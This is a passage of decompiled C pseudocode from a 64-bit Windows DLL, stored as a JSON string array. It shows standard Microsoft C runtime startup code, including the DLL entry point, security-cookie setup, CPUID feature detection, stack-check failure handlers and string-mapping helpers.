    "  qword_18004CA20[--qword_18004B060] = result;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180011344(",
    "        LPCWSTR lpLocaleName,",
    "        DWORD dwMapFlags,",
    "        LPCCH lpMultiByteStr,",
    "        int a4,",
    "        WCHAR *lpDestStr,",
    "        int cchDest,",
    "        __int64 CodePage,",
    "        int a8)",
    "{",
    "  int v8; // edi",
    "  int v12; // eax",
    "  bool v13; // cc",
    "  int v14; // eax",
    "  int v15; // r14d",
    "  unsigned __int64 v16; // rdx",
    "  __int64 v17; // rax",
    "  void *v18; // rsp",
    "  WCHAR *v19; // rbx",
    "  WCHAR *v20; // rax",
    "  int v22; // eax",
    "  unsigned int v23; // esi",
    "  unsigned __int64 v24; // rcx",
    "  __int64 v25; // rax",
    "  void *v26; // rsp",
    "  WCHAR *v27; // rdi",
    "  WCHAR *v28; // rax",
    "  WCHAR *v29; // rcx",
    "  bool v30; // zf",
    "  _BYTE v31[32]; // [rsp+0h] [rbp-50h] BYREF",
    "  LPSTR lpWideCharStr; // [rsp+20h] [rbp-30h]",
    "  int cchWideChar; // [rsp+28h] [rbp-28h]",
    "  LPCCH lpVersionInformation; // [rsp+30h] [rbp-20h]",
    "  LPBOOL lpReserved; // [rsp+38h] [rbp-18h]",
    "  _DWORD v36[8]; // [rsp+50h] [rbp+0h] BYREF",
    "",
    "  v8 = a4;",
    "  if ( a4 > 0 )",
    "  {",
    "    v12 = sub_180021A08(lpMultiByteStr, a4);",
    "    v13 = v12 < v8;",
    "    v8 = v12 + 1;",
    "    if ( !v13 )",
    "      v8 = v12;",
    "  }",
    "  v14 = MultiByteToWideChar(CodePage, a8 != 0 ? 9 : 1, lpMultiByteStr, v8, 0, 0);",
    "  v15 = v14;",
    "  if ( !v14 )",
    "    return 0;",
    "  v16 = (2LL * v14 + 16) & -(__int64)(2LL * v14 < (unsigned __int64)(2LL * v14 + 16));",
    "  if ( !v16 )",
    "    return 0;",
    "  if ( v16 > 0x400 )",
    "  {",
    "    v20 = (WCHAR *)sub_180020A84(v16);",
    "    v19 = v20;",
    "    if ( !v20 )",
    "      goto LABEL_14;",
    "    *(_DWORD *)v20 = 56797;",
    "  }",
    "  else",
    "  {",
    "    v17 = v16 + 15;",
    "    if ( v16 + 15 < v16 )",
    "      v17 = 0xFFFFFFFFFFFFFF0LL;",
    "    v18 = alloca(v17 & 0xFFFFFFFFFFFFFFF0uLL);",
    "    v19 = (WCHAR *)v36;",
    "    if ( v31 == (_BYTE *)-80LL )",
    "      return 0;",
    "    v36[0] = 52428;",
    "  }",
    "  v19 += 8;",
    "LABEL_14:",
    "  if ( !v19 )",
    "    return 0;",
    "  if ( !MultiByteToWideChar(CodePage, 1u, lpMultiByteStr, v8, v19, v15)",
    "    || (v22 = LCMapStringEx(lpLocaleName, dwMapFlags, v19, v15, 0, 0, 0, 0, 0), (v23 = v22) == 0) )",
    "  {",
    "    if ( *((_DWORD *)v19 - 4) == 56797 )",
    "      sub_18001A2CC(v19 - 8);",
    "    return 0;",
    "  }",
    "  if ( (dwMapFlags & 0x400) != 0 )",
    "  {",
    "    if ( cchDest && v22 <= cchDest )",
    "      LCMapStringEx(lpLocaleName, dwMapFlags, v19, v15, lpDestStr, cchDest, 0, 0, 0);",
    "    goto LABEL_43;",
    "  }",
    "  v24 = (2LL * v22 + 16) & -(__int64)(2LL * v22 < (unsigned __int64)(2LL * v22 + 16));",
    "  if ( v24 )",
    "  {",
    "    if ( v24 > 0x400 )",
    "    {",
    "      v28 = (WCHAR *)sub_180020A84(v24);",
    "      v27 = v28;",
    "      if ( !v28 )",
    "        goto LABEL_33;",
    "      *(_DWORD *)v28 = 56797;",
    "    }",
    "    else",
    "    {",
    "      v25 = v24 + 15;",
    "      if ( v24 + 15 < v24 )",
    "        v25 = 0xFFFFFFFFFFFFFF0LL;",
    "      v26 = alloca(v25 & 0xFFFFFFFFFFFFFFF0uLL);",
    "      v27 = (WCHAR *)v36;",
    "      if ( v31 == (_BYTE *)-80LL )",
    "        goto LABEL_43;",
    "      v36[0] = 52428;",
    "    }",
    "    v27 += 8;",
    "LABEL_33:",
    "    if ( v27 )",
    "    {",
    "      if ( !LCMapStringEx(lpLocaleName, dwMapFlags, v19, v15, v27, v23, 0, 0, 0) )",
    "      {",
    "        if ( *((_DWORD *)v27 - 4) == 56797 )",
    "          sub_18001A2CC(v27 - 8);",
    "        v29 = v19 - 8;",
    "        v30 = *((_DWORD *)v19 - 4) == 56797;",
    "        goto LABEL_44;",
    "      }",
    "      lpReserved = 0;",
    "      lpVersionInformation = 0;",
    "      if ( cchDest )",
    "      {",
    "        cchWideChar = cchDest;",
    "        lpWideCharStr = (LPSTR)lpDestStr;",
    "      }",
    "      else",
    "      {",
    "        cchWideChar = 0;",
    "        lpWideCharStr = 0;",
    "      }",
    "      v23 = WideCharToMultiByte(CodePage, 0, v27, v23, lpWideCharStr, cchWideChar, lpVersionInformation, lpReserved);",
    "      if ( *((_DWORD *)v27 - 4) == 56797 )",
    "        sub_18001A2CC(v27 - 8);",
    "    }",
    "  }",
    "LABEL_43:",
    "  v29 = v19 - 8;",
    "  v30 = *((_DWORD *)v19 - 4) == 56797;",
    "LABEL_44:",
    "  if ( v30 )",
    "    sub_18001A2CC(v29);",
    "  return v23;",
    "}",
    "",
    "",
    "__int64 sub_180011640()",
    "{",
    "  HMODULE ModuleHandleW; // rbx",
    "",
    "  ModuleHandleW = GetModuleHandleW((LPCWSTR)L\"kernel32.dll\");",
    "  GetCurrentPackageId = (LONG (__stdcall *)(UINT32 *, BYTE *))GetProcAddress(ModuleHandleW, \"GetCurrentPackageId\");",
    "  GetSystemTimePreciseAsFileTime = (__int64)GetProcAddress(ModuleHandleW, \"GetSystemTimePreciseAsFileTime\");",
    "  GetTempPath2W = (__int64)GetProcAddress(ModuleHandleW, \"GetTempPath2W\");",
    "  return 0;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "void __fastcall sub_1800116E0()",
    "{",
    "}_QWORD *__fastcall sub_1800116E8(_QWORD *a1, char a2)",
    "{",
    "  *a1 = &off_18003AB38;",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0();",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180011714(__int64 a1)",
    "{",
    "  __int64 i; // rbx",
    "  __int64 result; // rax",
    "",
    "  for ( i = a1; ; a1 = i )",
    "  {",
    "    result = sub_180020A84(a1);",
    "    if ( result )",
    "      break;",
    "    if ( !(unsigned int)sub_180021FE8(i) )",
    "    {",
    "      if ( i != -1 )",
    "        Concurrency::cancel_current_task();",
    "      Concurrency::cancel_current_task();",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180011750(__int64 a1, int a2, __int64 a3)",
    "{",
    "  int v3; // edx",
    "  int v4; // edx",
    "  __int64 result; // rax",
    "",
    "  if ( a2 )",
    "  {",
    "    v3 = a2 - 1;",
    "    if ( v3 )",
    "    {",
    "      v4 = v3 - 1;",
    "      if ( v4 )",
    "      {",
    "        if ( v4 != 1 )",
    "          return 1;",
    "        LOBYTE(result) = sub_180011B50();",
    "      }",
    "      else",
    "      {",
    "        LOBYTE(result) = sub_180011B28();",
    "      }",
    "      return (unsigned __int8)result;",
    "    }",
    "    else",
    "    {",
    "      return sub_1800117A0(a1, a3);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    LOBYTE(a1) = a3 != 0;",
    "    return sub_1800118B8(a1);",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800117A0(__int64 a1, __int64 a2)",
    "{",
    "  char v4; // bl",
    "  char v5; // di",
    "  __int64 v6; // rcx",
    "  _QWORD *v7; // rax",
    "",
    "  if ( !(unsigned __int8)sub_180011C0C(0) )",
    "    return 0;",
    "  v4 = sub_180011AA0();",
    "  v5 = 1;",
    "  if ( dword_18004CB80 )",
    "  {",
    "    sub_1800125E4(7);",
    "    __debugbreak();",
    "    JUMPOUT(0x1800118B6LL);",
    "  }",
    "  dword_18004CB80 = 1;",
    "  if ( (unsigned __int8)sub_180011B10() )",
    "  {",
    "    sub_18001272C();",
    "    sub_180012594();",
    "    sub_1800125B8();",
    "    if ( !(unsigned int)sub_1800220A4(&unk_180039428, &unk_180039460) )",
    "    {",
    "      if ( (unsigned __int8)sub_180011ADC() )",
    "      {",
    "        sub_180022060(&unk_1800393B0, &unk_180039420);",
    "        dword_18004CB80 = 2;",
    "        v5 = 0;",
    "      }",
    "    }",
    "  }",
    "  LOBYTE(v6) = v4;",
    "  sub_180011D6C(v6);",
    "  if ( v5 )",
    "    return 0;",
    "  v7 = (_QWORD *)sub_1800125D4();",
    "  if ( *v7 )",
    "  {",
    "    if ( (unsigned __int8)sub_180011CD4(v7) )",
    "      _guard_dispatch_icall_fptr(a1, 2, a2);",
    "  }",
    "  ++dword_18004CB78;",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800118B8(char a1)",
    "{",
    "  __int64 v3; // rcx",
    "  char v4; // bl",
    "  __int64 v5; // rcx",
    "  __int64 v6; // rcx",
    "  __int64 v7; // rcx",
    "  __int64 v8; // rcx",
    "  unsigned int v9; // ebx",
    "  __int64 v10; // rcx",
    "",
    "  if ( dword_18004CB78 <= 0 )",
    "    return 0;",
    "  --dword_18004CB78;",
    "  v4 = sub_180011AA0();",
    "  if ( dword_18004CB80 == 2 )",
    "  {",
    "    sub_180011BC8(v3);",
    "    sub_1800125A4(v5);",
    "    sub_180012768(v6);",
    "    dword_18004CB80 = 0;",
    "    LOBYTE(v7) = v4;",
    "    sub_180011D6C(v7);",
    "    LOBYTE(v8) = a1;",
    "    v9 = (unsigned __int8)sub_180011D90(v8, 0);",
    "    sub_180011BF8(v10);",
    "    return v9;",
    "  }",
    "  else",
    "  {",
    "    sub_1800125E4(7);",
    "    __debugbreak();",
    "    return sub_180011938();",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180011938(__int64 a1, int a2, __int64 a3)",
    "{",
    "  unsigned int v7; // ebx",
    "  unsigned int v8; // eax",
    "",
    "  if ( !a2 && dword_18004CB78 <= 0 )",
    "    return 0;",
    "  if ( (unsigned int)(a2 - 1) > 1 || (v7 = sub_180011750(a1, a2, a3)) != 0 )",
    "  {",
    "    v8 = sub_180004FD0(a1, a2);",
    "    v7 = v8;",
    "    if ( a2 == 1 && !v8 )",
    "    {",
    "      sub_180004FD0(a1, 0);",
    "      sub_1800118B8(a3 != 0);",
    "    }",
    "    if ( !a2 || a2 == 3 )",
    "      return (unsigned int)sub_180011750(a1, a2, a3) != 0;",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)",
    "{",
    "  if ( fdwReason == 1 )",
    "    sub_1800124E8();",
    "  return sub_180011938((__int64)hinstDLL, fdwReason, (__int64)lpReserved);",
    "}",
    "",
    "",
    "char sub_180011AA0()",
    "{",
    "  int v0; // eax",
    "  PVOID StackBase; // rcx",
    "  signed __int64 v2; // rax",
    "",
    "  LOBYTE(v0) = __uncaught_exception();",
    "  if ( v0 )",
    "  {",
    "    StackBase = NtCurrentTeb()->NtTib.StackBase;",
    "    while ( 1 )",
    "    {",
    "      v2 = _InterlockedCompareExchange64(&qword_18004CB88, (signed __int64)StackBase, 0);",
    "      if ( !v2 )",
    "        break;",
    "      if ( StackBase == (PVOID)v2 )",
    "        return 1;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "char sub_180011ADC()",
    "{",
    "  int v0; // eax",
    "  unsigned int v1; // eax",
    "",
    "  LOBYTE(v0) = __uncaught_exception();",
    "  if ( v0 )",
    "  {",
    "    sub_180011F0C();",
    "  }",
    "  else",
    "  {",
    "    v1 = sub_180001AF0();",
    "    if ( (unsigned int)sub_18002276C(v1) )",
    "      return 0;",
    "    sub_180022B38();",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "bool sub_180011B10()",
    "{",
    "  return (unsigned __int8)sub_180011C48(0) != 0;",
    "}",
    "",
    "",
    "char __fastcall sub_180011B28(#96 *a1)",
    "{",
    "  #96 *v1; // rcx",
    "",
    "  if ( !Concurrency::details::ScheduleGroupSegmentBase::HasUnrealizedChores(a1) )",
    "    return 0;",
    "  if ( !Concurrency::details::ScheduleGroupSegmentBase::HasUnrealizedChores(v1) )",
    "  {",
    "    sub_1800139A4();",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_180011B50()",
    "{",
    "  sub_1800230A0();",
    "  sub_1800139A4();",
    "  return 1;",
    "}",
    "",
    "",
    "void __fastcall sub_180011B68(",
    "        __int64 a1,",
    "        int a2,",
    "        __int64 a3,",
    "        void (__fastcall *a4)(__int64, _QWORD, __int64),",
    "        int a5,",
    "        __int64 a6)",
    "{",
    "  int v10; // eax",
    "",
    "  LOBYTE(v10) = __uncaught_exception();",
    "  if ( !v10 && a2 == 1 )",
    "    a4(a1, 0, a3);",
    "  JUMPOUT(0x1800220ECLL);",
    "}",
    "",
    "",
    "void sub_180011BC8()",
    "{",
    "  int v0; // eax",
    "",
    "  LOBYTE(v0) = __uncaught_exception();",
    "  if ( v0 )",
    "  {",
    "    sub_180022E98(&xmmword_18004CB98);",
    "  }",
    "  else if ( !(unsigned int)sub_18002253C() )",
    "  {",
    "    cexit();",
    "  }",
    "}",
    "",
    "",
    "__int64 sub_180011BF8()",
    "{",
    "  sub_1800230E8(0);",
    "  return sub_1800139D0();",
    "}",
    "",
    "",
    "char __fastcall sub_180011C0C(int a1)",
    "{",
    "  if ( !a1 )",
    "    byte_18004CB90 = 1;",
    "  sub_180011F0C();",
    "  if ( !(unsigned __int8)sub_180013968() )",
    "    return 0;",
    "  if ( !(unsigned __int8)sub_180023078() )",
    "  {",
    "    sub_1800139B4(0);",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180011C48(unsigned int a1)",
    "{",
    "  int v2; // eax",
    "",
    "  if ( !byte_18004CB91 )",
    "  {",
    "    if ( a1 > 1 )",
    "    {",
    "      sub_1800125E4(5);",
    "      JUMPOUT(0x180011CD2LL);",
    "    }",
    "    LOBYTE(v2) = __uncaught_exception();",
    "    if ( !v2 || a1 )",
    "    {",
    "      xmmword_18004CB98 = (__int128)_mm_load_si128((const __m128i *)&xmmword_18003A840);",
    "      qword_18004CBA8 = -1;",
    "      xmmword_18004CBB0 = xmmword_18004CB98;",
    "      qword_18004CBC0 = -1;",
    "    }",
    "    else if ( (unsigned int)sub_180022EDC(&xmmword_18004CB98) || (unsigned int)sub_180022EDC(&xmmword_18004CBB0) )",
    "    {",
    "      return 0;",
    "    }",
    "    byte_18004CB91 = 1;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "bool __fastcall sub_180011CD4(__int64 a1)",
    "{",
    "  _DWORD *v2; // rcx",
    "  unsigned __int64 v3; // r8",
    "  _DWORD *v4; // rdx",
    "  _DWORD *v5; // r9",
    "  unsigned __int64 v6; // rcx",
    "",
    "  if ( MEMORY[0x180000000] != 23117 )",
    "    return 0;",
    "  v2 = (_DWORD *)(0x180000000LL + MEMORY[0x18000003C]);",
    "  if ( *v2 != 17744 || *(_WORD *)(0x180000018LL + MEMORY[0x18000003C]) != 523 )",
    "    return 0;",
    "  v3 = a1 - 0x180000000LL;",
    "  v4 = (_DWORD *)((char *)v2 + *(unsigned __int16 *)(0x180000014LL + MEMORY[0x18000003C]) + 24);",
    "  v5 = &v4[10 * *(unsigned __int16 *)(0x180000006LL + MEMORY[0x18000003C])];",
    "  while ( v4 != v5 )",
    "  {",
    "    v6 = (unsigned int)v4[3];",
    "    if ( v3 >= v6 && v3 < (unsigned int)(v6 + v4[2]) )",
    "      return v4 && v4[9] >= 0;",
    "    v4 += 10;",
    "  }",
    "  v4 = 0;",
    "  return v4 && v4[9] >= 0;",
    "}",
    "",
    "",
    "char __fastcall sub_180011D6C(char a1)",
    "{",
    "  int v2; // eax",
    "",
    "  LOBYTE(v2) = __uncaught_exception();",
    "  if ( v2 && !a1 )",
    "    _InterlockedExchange64(&qword_18004CB88, 0);",
    "  return v2;",
    "}",
    "",
    "",
    "char __fastcall sub_180011D90(char a1, char a2)",
    "{",
    "  __int64 v3; // rcx",
    "",
    "  if ( !byte_18004CB90 || !a2 )",
    "  {",
    "    sub_1800230B0();",
    "    LOBYTE(v3) = a1;",
    "    sub_1800139B4(v3);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180011DBC(__int64 a1)",
    "{",
    "  int v2; // eax",
    "  __int64 v3; // rdx",
    "",
    "  if ( (_QWORD)xmmword_18004CB98 == -1 )",
    "    v2 = sub_180022E88();",
    "  else",
    "    v2 = sub_180022F04(&xmmword_18004CB98, a1);",
    "  v3 = 0;",
    "  if ( !v2 )",
    "    return a1;",
    "  return v3;",
    "}",
    "",
    "",
    "int __cdecl atexit(void (__cdecl *a1)())",
    "{",
    "  return (sub_180011DBC((__int64)a1) != 0) - 1;",
    "}",
    "",
    "",
    "__int64 __fastcall _GSHandlerCheck(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  _GSHandlerCheckCommon(a2, a4, *(_QWORD *)(a4 + 56));",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall _GSHandlerCheckCommon(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // rcx",
    "  __int64 result; // rax",
    "",
    "  v2 = *(unsigned int *)(*(_QWORD *)(a2 + 16) + 8LL);",
    "  result = *(_QWORD *)(a2 + 8);",
    "  if ( (*(_BYTE *)(v2 + result + 3) & 0xF) != 0 )",
    "    return *(_BYTE *)(v2 + result + 3) & 0xF0;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall _GSHandlerCheck_EH4(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 v4; // rbx",
    "  __int64 result; // rax",
    "",
    "  v4 = *(_QWORD *)(a4 + 56);",
    "  _GSHandlerCheckCommon(a2, a4);",
    "  result = 1;",
    "  if ( ((((*(_DWORD *)(a1 + 4) & 0x66) != 0) + 1) & *(_DWORD *)(v4 + 4)) != 0 )",
    "    return _CxxFrameHandler4(a1, a2, a3, a4);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_180011F0C()",
    "{",
    "  int v5; // r10d",
    "  int v6; // r8d",
    "  int v7; // r9d",
    "  int v8; // r14d",
    "  int v14; // edi",
    "  int v15; // eax",
    "  unsigned __int64 v16; // rax",
    "  __int64 v17; // rcx",
    "  int v18; // r8d",
    "  int v19; // r9d",
    "  int v20; // esi",
    "  int v21; // r11d",
    "  unsigned int v22; // r10d",
    "  unsigned __int64 v38; // rax",
    "  int v39; // eax",
    "  unsigned __int64 v40; // rax",
    "  __int64 v41; // rcx",
    "  int v43; // [rsp+30h] [rbp+20h]",
    "",
    "  _RAX = 0;",
    "  __asm { cpuid }",
    "  v5 = _RDX ^ 0x49656E69;",
    "  v6 = _RCX ^ 0x6C65746E;",
    "  v7 = _RBX;",
    "  v8 = _RAX;",
    "  _RAX = 1;",
    "  __asm { cpuid }",
    "  v14 = _RCX;",
    "  if ( !(v7 ^ 0x756E6547 | v6 | v5)",
    "    && ((qword_18004B0E0 = -1, v15 = _RAX & 0xFFF3FF0, qword_18004B0D8 = 0x8000, v15 == 67264)",
    "     || v15 == 132704",
    "     || v15 == 132720",
    "     || (v16 = (unsigned int)(v15 - 198224), (unsigned int)v16 <= 0x20) && (v17 = 0x100010001LL, _bittest64(&v17, v16))) )",
    "  {",
    "    v18 = dword_18004CBCC | 1;",
    "    dword_18004CBCC |= 1u;",
    "  }",
    "  else",
    "  {",
    "    v18 = dword_18004CBCC;",
    "  }",
    "  v19 = 0;",
    "  v20 = 0;",
    "  v21 = 0;",
    "  v22 = 0;",
    "  if ( v8 >= 7 )",
    "  {",
    "    _RAX = 7;",
    "    __asm { cpuid }",
    "    v20 = _RDX;",
    "    v19 = _RBX;",
    "    if ( (_RBX & 0x200) != 0 )",
    "      dword_18004CBCC = v18 | 2;",
    "    if ( (int)_RAX >= 1 )",
    "    {",
    "      _RAX = 7;",
    "      __asm { cpuid }",
    "      v21 = _RDX;",
    "    }",
    "    _RAX = 36;",
    "    if ( v8 >= 36 )",
    "    {",
    "      __asm { cpuid }",
    "      v22 = _RBX;",
    "    }",
    "  }",
    "  v38 = qword_18004B0C8 & 0xFFFFFFFFFFFFFFFEuLL;",
    "  dword_18004B0D0 = 1;",
    "  dword_18004B0D4 = 2;",
    "  qword_18004B0C8 &= ~1uLL;",
    "  if ( (v14 & 0x100000) != 0 )",
    "  {",
    "    v38 &= ~0x10uLL;",
    "    dword_18004B0D0 = 2;",
    "    qword_18004B0C8 = v38;",
    "    dword_18004B0D4 = 6;",
    "  }",
    "  if ( (v14 & 0x8000000) != 0 )",
    "  {",
    "    __asm { xgetbv }",
    "    v43 = v38;",
    "    if ( (v14 & 0x10000000) == 0 || (v38 & 6) != 6 )",
    "    {",
    "LABEL_32:",
    "      if ( (v22 & 0x200000) != 0 && (*(_QWORD *)&v43 & 0x80000LL) != 0 )",
    "        qword_18004B0C8 &= ~0x80uLL;",
    "      return 0;",
    "    }",
    "    v39 = dword_18004B0D4 | 8;",
    "    dword_18004B0D0 = 3;",
    "    dword_18004B0D4 |= 8u;",
    "    if ( (v19 & 0x20) != 0 )",
    "    {",
    "      dword_18004B0D0 = 5;",
    "      dword_18004B0D4 = v39 | 0x20;",
    "      v40 = qword_18004B0C8 & 0xFFFFFFFFFFFFFFFDuLL;",
    "      qword_18004B0C8 &= ~2uLL;",
    "      if ( (v19 & 0xD0030000) != 0xD0030000 )",
    "      {",
    "LABEL_26:",
    "        if ( (v20 & 0x800000) != 0 )",
    "          qword_18004B0C8 = v40 & 0xFFFFFFFFFEFFFFFFuLL;",
    "        if ( (v21 & 0x80000) != 0 && (v43 & 0xE0) == 0xE0 )",
    "        {",
    "          dword_18004CBC8 = v22 & 0x400FF;",
    "          v41 = qword_18004B0C8 & ~(HIWORD(v22) & 7 | 0x1000028LL);",
    "          qword_18004B0C8 = v41;",
    "          if ( (v22 & 0x400FF) > 1 )",
    "            qword_18004B0C8 = v41 & 0xFFFFFFFFFFFFFFBFuLL;",
    "        }",
    "        goto LABEL_32;",
    "      }",
    "      if ( (v43 & 0xE0) == 0xE0 )",
    "      {",
    "        dword_18004B0D4 |= 0x40u;",
    "        v40 = qword_18004B0C8 & 0xFFFFFFFFFFFFFFDBuLL;",
    "        dword_18004B0D0 = 6;",
    "        qword_18004B0C8 &= 0xFFFFFFFFFFFFFFDBuLL;",
    "        goto LABEL_26;",
    "      }",
    "    }",
    "    v40 = qword_18004B0C8;",
    "    goto LABEL_26;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "unsigned __int64 __fastcall _alloca_probe()",
    "{",
    "  unsigned __int64 result; // rax",
    "  char *v1; // r10",
    "  char *StackLimit; // r11",
    "  char v3; // [rsp+18h] [rbp+8h] BYREF",
    "",
    "  v1 = &v3 - result;",
    "  if ( (unsigned __int64)&v3 < result )",
    "    v1 = 0;",
    "  StackLimit = (char *)NtCurrentTeb()->NtTib.StackLimit;",
    "  if ( v1 < StackLimit )",
    "  {",
    "    LOWORD(v1) = (unsigned __int16)v1 & 0xF000;",
    "    do",
    "    {",
    "      StackLimit -= 4096;",
    "      *StackLimit = 0;",
    "    }",
    "    while ( v1 != StackLimit );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "BOOL __fastcall _raise_securityfailure(struct _EXCEPTION_POINTERS *ExceptionInfo)",
    "{",
    "  HANDLE CurrentProcess; // rax",
    "",
    "  SetUnhandledExceptionFilter(0);",
    "  UnhandledExceptionFilter(ExceptionInfo);",
    "  CurrentProcess = GetCurrentProcess();",
    "  return TerminateProcess(CurrentProcess, 0xC0000409);",
    "}",
    "",
    "",
    "void __cdecl  _report_gsfailure(uintptr_t StackCookie)",
    "{",
    "  __int64 retaddr; // [rsp+38h] [rbp+0h]",
    "  uintptr_t v2; // [rsp+40h] [rbp+8h] BYREF",
    "",
    "  v2 = StackCookie;",
    "  if ( IsProcessorFeaturePresent(0x17u) )",
    "    __fastfail(2u);",
    "  capture_previous_context((PCONTEXT)&unk_18004CC70);",
    "  qword_18004CD68 = retaddr;",
    "  qword_18004CD08 = (__int64)&v2;",
    "  qword_18004CBE0 = retaddr;",
    "  qword_18004CCF0 = v2;",
    "  dword_18004CBD0 = -1073740791;",
    "  dword_18004CBD4 = 1;",
    "  dword_18004CBE8 = 1;",
    "  unk_18004CBF0 = 2;",
    "  _raise_securityfailure((struct _EXCEPTION_POINTERS *)&ExceptionInfo);",
    "}",
    "",
    "",
    "__int64 sub_180012348()",
    "{",
    "  return _report_securityfailure(8);",
    "}",
    "",
    "",
    "BOOL __fastcall _report_securityfailure(unsigned int a1)",
    "{",
    "  __int64 retaddr; // [rsp+28h] [rbp+0h]",
    "  unsigned int v3; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v3 = a1;",
    "  if ( IsProcessorFeaturePresent(0x17u) )",
    "    __fastfail(v3);",
    "  capture_current_context((PCONTEXT)&unk_18004CC70);",
    "  qword_18004CD68 = retaddr;",
    "  qword_18004CD08 = (__int64)&v3;",
    "  qword_18004CBE0 = retaddr;",
    "  dword_18004CBD0 = -1073740791;",
    "  dword_18004CBD4 = 1;",
    "  dword_18004CBE8 = 1;",
    "  unk_18004CBF0 = v3;",
    "  return _raise_securityfailure((struct _EXCEPTION_POINTERS *)&ExceptionInfo);",
    "}",
    "",
    "",
    "struct _IMAGE_RUNTIME_FUNCTION_ENTRY *__fastcall capture_current_context(PCONTEXT ContextRecord)",
    "{",
    "  ULONG64 Rip; // rdi",
    "  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *result; // rax",
    "  unsigned __int64 ImageBase; // [rsp+50h] [rbp+8h] BYREF",
    "  unsigned __int64 EstablisherFrame; // [rsp+58h] [rbp+10h] BYREF",
    "  PVOID HandlerData; // [rsp+60h] [rbp+18h] BYREF",
    "",
    "  RtlCaptureContext(ContextRecord);",
    "  Rip = ContextRecord->Rip;",
    "  result = RtlLookupFunctionEntry(Rip, &ImageBase, 0);",
    "  if ( result )",
    "    return (struct _IMAGE_RUNTIME_FUNCTION_ENTRY *)RtlVirtualUnwind(",
    "                                                     0,",
    "                                                     ImageBase,",
    "                                                     Rip,",
    "                                                     result,",
    "                                                     ContextRecord,",
    "                                                     &HandlerData,",
    "                                                     &EstablisherFrame,",
    "                                                     0);",
    "  return result;",
    "}",
    "",
    "",
    "struct _IMAGE_RUNTIME_FUNCTION_ENTRY *__fastcall capture_previous_context(PCONTEXT ContextRecord)",
    "{",
    "  ULONG64 Rip; // rsi",
    "  int i; // edi",
    "  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *result; // rax",
    "  unsigned __int64 ImageBase; // [rsp+60h] [rbp+8h] BYREF",
    "  unsigned __int64 EstablisherFrame; // [rsp+68h] [rbp+10h] BYREF",
    "  PVOID HandlerData; // [rsp+70h] [rbp+18h] BYREF",
    "",
    "  RtlCaptureContext(ContextRecord);",
    "  Rip = ContextRecord->Rip;",
    "  for ( i = 0; i < 2; ++i )",
    "  {",
    "    result = RtlLookupFunctionEntry(Rip, &ImageBase, 0);",
    "    if ( !result )",
    "      break;",
    "    result = (struct _IMAGE_RUNTIME_FUNCTION_ENTRY *)RtlVirtualUnwind(",
    "                                                       0,",
    "                                                       ImageBase,",
    "                                                       Rip,",
    "                                                       result,",
    "                                                       ContextRecord,",
    "                                                       &HandlerData,",
    "                                                       &EstablisherFrame,",
    "                                                       0);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_1800124E8()",
    "{",
    "  uintptr_t v0; // rax",
    "  __int64 result; // rax",
    "  struct _FILETIME v2; // [rsp+20h] [rbp-10h] BYREF",
    "  struct _FILETIME SystemTimeAsFileTime; // [rsp+40h] [rbp+10h] BYREF",
    "  LARGE_INTEGER PerformanceCount; // [rsp+48h] [rbp+18h] BYREF",
    "",
    "  v0 = _security_cookie;",
    "  if ( _security_cookie == 0x2B992DDFA232LL )",
    "  {",
    "    SystemTimeAsFileTime = 0;",
    "    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);",
    "    v2 = SystemTimeAsFileTime;",
    "    v2 = (struct _FILETIME)(GetCurrentThreadId() ^ *(unsigned __int64 *)&v2);",
    "    v2 = (struct _FILETIME)(GetCurrentProcessId() ^ *(unsigned __int64 *)&v2);",
    "    QueryPerformanceCounter(&PerformanceCount);",
    "    v0 = ((unsigned __int64)&v2",
    "        ^ *(_QWORD *)&v2",
    "        ^ PerformanceCount.QuadPart",
    "        ^ ((unsigned __int64)PerformanceCount.LowPart << 32))",
    "       & 0xFFFFFFFFFFFFLL;",
    "    if ( v0 == 0x2B992DDFA232LL )",
    "      v0 = 0x2B992DDFA233LL;",
    "    _security_cookie = v0;",
    "  }",
    "  result = ~v0;",
    "  qword_18004B0C0 = result;",
    "  return result;",
    "}",
    "",
    "",
    "void sub_180012594()",
    "{",
    "  InitializeSListHead(&stru_18004D140);",
    "}",
    "",
    "",
    "__int64 sub_1800125A4()",
    "{",
    "  return sub_180013A08(&stru_18004D140);",
    "}",
    "",
    "",
    "_QWORD *sub_1800125B8()",
    "{",
    "  _QWORD *v0; // rax",
    "  _QWORD *result; // rax",
    "",
    "  v0 = (_QWORD *)sub_180001230();",
    "  *v0 |= 0x24uLL;",
    "  result = (_QWORD *)sub_1800125B0();",
    "  *result |= 2uLL;",
    "  return result;",
    "}",
    "",
    "",
    "void *sub_1800125D4()",
    "{",
    "  return &unk_18004E208;",
    "}",
